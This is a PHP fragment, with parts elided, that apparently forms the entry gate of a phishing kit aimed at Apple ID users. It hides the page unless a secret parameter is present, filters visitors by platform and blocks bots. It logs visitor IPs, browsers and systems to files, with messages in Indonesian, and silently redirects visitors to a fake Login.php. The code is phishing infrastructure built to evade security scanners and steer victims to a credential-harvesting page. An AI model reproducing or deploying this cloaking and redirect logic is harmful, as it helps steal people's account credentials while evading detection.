...
if($setting['site_parameter'] == 1) {
    ...
    if(isset($_GET[$secret])) {
        ...
        $click = fopen("result/log_visitor.txt","a");
        $jam = date("h:i:sa");
        fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Ada bot (Gagal Masuk Site Parameter)"."\n");
        fclose($click);
        $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED BOT INDEX || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("result/total_bot.txt","a");
...
if($setting['lock_platform'] == 1) {
    if($os == "iPhone" or $os == "iPad" or $os == "iPod" or $os == "Mac OS X" or $os == "Mac OS 9") {
        ...
        $click = fopen("result/log_visitor.txt","a");
        fwrite($click,"[$ip2 - $br - $os] Gagal Masuk Lock Platform"."\n");
        fclose($click);
        $file = fopen("block_bot.txt","a");
...
echo "<!--$random_id-->";
echo "<script type='text/javascript'>window.top.location='Login.php?websrc=".md5('')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ';</script>";

//header("location: manage/?p=login&appIdKey=".$key."&country=".$cid."");
?>